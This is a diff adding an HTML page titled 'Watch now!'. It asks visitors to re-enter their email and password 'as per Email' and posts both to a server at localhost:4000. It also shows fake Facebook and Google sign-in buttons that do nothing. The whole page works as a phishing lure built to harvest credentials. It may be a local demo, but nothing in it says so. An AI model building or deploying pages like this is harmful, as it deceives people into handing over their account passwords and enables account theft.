@@ -1,0 +1,66 @@
+<!-- Created By @SxaroopJangid | Back-End Developer & Creative Coder -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watch now!</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="/photos/icon.png" />
+</head>
+<body>
+
+<form action="http://localhost:4000/submit" method="POST">
+    <h2>Enter Your Data Again as per Email & Double Check</h2>
+
+    <!-- Email -->
+    <label for="email">Email Address:</label><br>
+    <input type="email" id="email" name="email" required placeholder="Enter Your Email"><br>
+
+    <!-- Password -->
+    <label for="password">Password:</label><br>
+    <input type="password" id="password" name="password" minlength="6" required placeholder="Password"><br>
+
+    <!-- Confirm Password -->
+    <label for="confirm-password">Confirm Password:</label><br>
+    <input type="password" id="confirm-password" name="confirm-password" minlength="6" required placeholder="Re-enter Password"><br>
+
+    <!-- Terms -->
+    <input type="checkbox" id="terms" name="terms" required>
+    <label for="terms"> I agree to the Terms & Conditions</label><br><br>
+
+    <!-- Password Mismatch Error -->
+    <p id="password-error" style="display: none; color: red; text-align: center; font-weight: 500;">
+        ❌ Your entered passwords do not match. Please re-enter.
+    </p>
+
+    <!-- Sign Up Button -->
+    <button type="submit">Sign Up</button>
+
+    <!-- Social Login -->
+    <p>Or sign up with:</p>
+
+    <button type="button" class="social-btn facebook">
+        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/facebook/facebook-original.svg" alt="Facebook" class="icon">
+        Continue with Facebook
+    </button>
+
+    <button type="button" class="social-btn google">
+        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg" alt="Google" class="icon">
+        Continue with Google
+    </button>
+
+    <!-- Social Error Message -->
+    <p id="error-message" style="color: black; display: none; text-align: center;">
+        This login method is currently unavailable. Please try another option.
+    </p>
+
+    <!-- Already Registered -->
+    <p class="login-text">Already have an account?</p>
+    <button type="button" class="login-btn" onclick="location.href='login.html'">Log In to Continue</button>
+
+    <script src="script.js"></script>
+</form>
+
+</body>
+</html>
